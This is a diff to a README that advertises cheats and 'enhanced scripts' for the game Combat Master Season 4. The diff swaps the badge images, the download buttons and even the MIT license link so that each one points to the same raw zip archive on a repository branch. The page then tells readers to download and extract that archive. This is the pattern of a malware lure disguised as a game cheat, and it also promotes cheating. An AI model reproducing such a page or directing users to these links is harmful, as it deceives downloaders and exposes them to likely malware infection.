@@ -1,9 +1,9 @@
 # 🕹️ Combat Master Season 4 Hacks Cheats & Enhanced Scripts
 
-![GitHub Stars](https://img.shields.io/github/stars/CombatMasterS4/HacksCheats?style=for-the-badge)
-![GitHub forks](https://img.shields.io/github/forks/CombatMasterS4/HacksCheats?style=for-the-badge)
-![Issues](https://img.shields.io/github/issues/CombatMasterS4/HacksCheats?style=for-the-badge)
-![License: MIT](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
+![GitHub Stars](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+![GitHub forks](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+![Issues](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+![License: MIT](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
 
 ### Welcome to the definitive portal for **Combat Master Season 4 Hacks**—your toolkit for elevating gameplay to legendary status.
 
@@ -16,7 +16,7 @@ Unleash a wave of intelligence-driven scripts and boundary-pushing solutions cra
 Start your Combat Master enhancement adventure with a **one-click step**!  
 **Step 1:** Click the banner below for a seamless download and setup process.
 
-[![Download](https://img.shields.io/badge/Download-Combat%20Master%20Enhancer-blue?style=for-the-badge)](https://YeneMo.github.io)
+[![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
 
 ---
 
@@ -112,7 +112,7 @@ Our repository doesn’t just automate gameplay. It **synergizes AI intelligence
    Ensure you have the latest version of Combat Master Season 4 installed.
 2. **Download:**  
    Click below to access the combat-ready enhancement suite:  
-   [![Download](https://img.shields.io/badge/Download-Combat%20Master%20Enhancer-blue?style=for-the-badge)](https://YeneMo.github.io)
+   [![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
 3. **Extract:**  
    Unzip the downloaded file into your preferred game scripts directory.
 4. **Setup:**  
@@ -135,7 +135,7 @@ By using this repository, you accept full responsibility for your compliance wit
 ## 📜 MIT License
 
 This project is licensed under the MIT License (2025).  
-Explore the full license text here: [MIT LICENSE](https://opensource.org/licenses/MIT)
+Explore the full license text here: [MIT LICENSE](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
 
 ---
 
@@ -143,7 +143,7 @@ Explore the full license text here: [MIT LICENSE](https://opensource.org/license
 
 Ready to supercharge your Combat Master journey? Tap below to open possibilities where only legends tread:
 
-[![Download](https://img.shields.io/badge/Download-Combat%20Master%20Enhancer-blue?style=for-the-badge)](https://YeneMo.github.io)
+[![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
 
 #### *Unlock mastery. Elevate gameplay. Experience true innovation.*  
 —The Combat Master S4 Enhancements Team
